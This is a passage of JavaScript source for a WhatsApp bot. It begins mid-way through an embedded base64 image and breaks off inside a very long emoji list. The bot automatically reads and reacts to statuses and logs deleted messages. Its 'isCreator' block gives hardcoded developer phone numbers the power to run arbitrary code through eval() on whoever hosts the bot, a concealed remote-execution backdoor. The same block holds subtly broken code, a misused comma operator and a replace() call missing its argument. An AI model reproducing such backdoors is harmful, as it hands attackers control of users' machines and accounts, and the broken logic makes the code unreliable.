t+E8ApGZSFzO45v6w9NnWu7cW4cmiAA8r9KmHPwfSaDWbwJ5uL+EDw+v9ZqpdnIZ1cWWuR3AzJApEqIGJxPsOP+HCHxhOu0m5nvc7bRmiOacnSNpeUEZBTnBsDu5elfOVd6XAyJ+9xOtESiiRM9oivBHqHvs613biRSw/jgHh9f63HVP1P5qFRBe3OJqbiCQ3K5ByYcfr7f4KACrYCjh8XzbvXZPmJNArEmaOhke208MCfQ2thAnFI2909tyf8uTgYdI2iJyPsDs613bnT/jAHh9f65BRyqErI2GB8B44UIklzczcRh/RRPqwEI/neRIVxyvn022unj4enrtNzodx8/ptdd2da7tzp/xgDw+v9gtlFHmjhWHAPcG8CWycH2rHgF+UcfBDNqIvAebi7TL7yNXv2NpudDuPn9NrruzrXdudP+MAeH1/sfAUZ0eNe6vA4/e5oabf9ThSC+cFcPr8aACqwFQ2fztFpaSDEZ+M/wAAv8Nx8fptdd2dW7tw+1+AC/lLaWePf+yzBimfB1KnGA4mPHUbmI7rwxpjPl8PsvQUghMvwYG3hpTPMY8jV47ZmCwTAUPQzMyMt0cDe9m0iyyGfkPptCW1HJKIaJMemG0rrAPUfE7CsYCugsfO4z5E5kYLzLem+FAJXKhxkI6LL2jaDfifL9mmZJKEaQcFjLkceG75DeTr60svzGH4a4nGK67kutzw5uVMakPq4HWoAbmcxz3c7IzHnl0p721+RQHy847fx6ZIQKpdbE3BO31wnYQAMlcmx9eLuC44WOmwSCMJhUIEkwyzHvO0YyQUiU7BdPOTNZ784fFOXttePNEPMpowvKMvDVx3C6JZWOvb9oxIguJlUAmKcOHi470211RTsgqr00jIyjP59CTBgBH+LffE8eBWc6I0Mj223x4Dlo9e/P8AKeCWFWspx7QftubqVzdaEPOUSJ+QvgiF16UE5ZVI/nKHUqsUDnC7i9W4kFQmZQNLS0PD3/GV5ZVAFSsUzxerw4fuLkC3HuNGhZa4Xo1/DjE0WKDTBIXcmXPtVjPxKm1YpRm6f01ocnd7HzFBjyZ/GVBWiUiUsvN7TVjlJt/u5754BYlY55+vvU2fz5HvaokzUneRDGQFOgyvA9prCZM2x+392LD/AJXGhTUp+p70YTmj+ij5L4LRMmcTWE50BexRzOcn4UUltb/R3rj0TC5ab3UACsAHKrzj5rwD5rzX5rx35ryH5rwP5rxv5oSEHH7a4vcm/GKMjDXSMRQeBeWtedfNedfNDQs4/dXHCyn/AOcWMKMAZ1ataLr1aj8twwdT+jYhVMAZ0Z2u6ZPHpsSxjc8TzKofIuHqj+ih5f2HcQ7xubevKmNyGDxH9DaoYL6Bqzfwf0TsEoKVWwU70GM9f0a1QwX0DQE4rXC8yjW1Rgr/AKUTvYgA8f8A0/8A/9oADAMBAAIAAwAAABDzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzLz6DsLjgfjzTDzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzy6u5v5AEMGKC1Qhzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/AMto7MDBFLJwEo8w48888888888888888888888888888888888umCm6BRO4+8IAk8U808888888888888888888888888888888888s8s88Yuh88ss88c88888888888888888888888888888888888888888888888888U8k888888888888888888888888888888888888888888888888U880U8088888888888888888888888888888888888888848488U884ssY888888888888888888888888888888888888888U0cw8U8888wwc888888888888888888888888888888888888848s088U88884MM08888888888888888888888888888888888888McM88U88404c408888888888888888888884888888888888884wsY08U808g0sE8888888888888888888884UY8888888888ss8k88888U8Q088c88888888888888888888888c8s888888888ck48sMc88U8c88888888888888888888888888884880888888g8Uo888o88U888888888888888888888888888888848s888888c48s0o8s80U80888Us8888888888888888888888888Y88M8wk888ccc8c84c48sc8c8k88888888888888888888888888sw88880o4888884U88Y888848888888888888888888888888888sMcsM888MMss8c8888ssMc8888888888888888888888888888888888888888888888888888888888888888888888888888888884c488888888888888888888888888888888888888888888888840s8888888888888888888888888888888888888888888888888Ic888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888//EACURAQACAQMDAwUAAAAAAAAAAAEAETEQIeFBUFEgcaGBkJGg8f/aAAgBAwEBPxD7O9+gONrF3H6JwaV59pk0vxzxEZU9qYEdmBKqOUyUaUvZvojrhr8/yLUO0OmOjNrox9/QiN1uwTW7z2lg1mZl1mZYKNkEHrofPMszHTW/jmOqWvcBqfPrrEVv7b//xAAeEQEAAgMBAAMBAAAAAAAAAAABABEQITFQUXGQoP/aAAgBAgEBPxD8dzBgzBs0agu/U2chHlARZ2XDcSjC2qwlocp+ycK+QY6wRbiIjTlhaU3R0rvkjE+JyJc5nETUtgFc9FXROf1v/wD/xAAtEAEAAQMDAwMEAgMBAQEAAAABEQAhMUFRYRBxgSCRoTBgsfBQwUDR4fGwgP/aAAgBAQABPxD/AON7Fa9EUBWkLh4qM9AXA0iZH7XYfMkRsBUVgST3cM1kZ4teNzogAq6FPVJKaJ2Q01JZWexLPhqaLUkciAytij0TtZK85po66SURFC+V5m5U8l0MLvYqxFaBPLSu66L3ClSJoZPd6gFojMTQaBcC9BLBYCVo+tEFNHDDUS2plohlo3DI5iKVUKykyLM9/st7zQF1W0UaYyxLyNAwuV8VFjxiNHnJA/UZMNSDhiw7JwkPmj3gJVLi7ucHejBXZM99aHJm8bLubDcvU7juSJ38jI9qCIysURUIvJZ6kAAQjqUC0sBg6yYgB2pipVl5o2u0HAani9EkUHEKU6E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` }, caption: up })
  }
  })
  conn.ev.on('creds.update', saveCreds)

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 
          
  //=============readstatus=======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
  if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key])
    }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const jawadlike = await conn.decodeJid(conn.user.id);
    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  }                       
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'Sin Nombre'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
  const udp = botNumber.split('@')[0];
    const jawad = ('254111385747', '254732297194', '254756466053');
    let isCreator = [udp, jawad, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('%')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}
 //================ownerreact==============
    
  if(senderNumber.includes("254732297194")){
  if(isReact) return
  m.react("💙")
   }
  //==========public react============//
  // Auto React 
  if (!isReact && senderNumber !== botNumber) {
      if (config.AUTO_REACT === 'true') {
          const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', 